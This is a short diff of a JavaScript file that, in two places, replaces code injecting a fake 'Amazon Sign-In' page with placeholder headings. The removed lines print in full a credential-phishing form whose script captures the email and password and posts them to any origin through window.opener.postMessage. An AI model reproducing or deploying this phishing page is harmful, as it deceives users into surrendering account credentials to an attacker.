@@ -9,7 +9,7 @@
   var z;
   
   if(location.href.indexOf("fake") !== -1){
-  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  document.body.innerHTML = "<h1>page 1</h1>";
   }
   
   
@@ -29,7 +29,7 @@
   
   alert("Redirecting");
   
-  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  document.body.innerHTML = "<h1>page 2</h1>";
   
   slow();
   
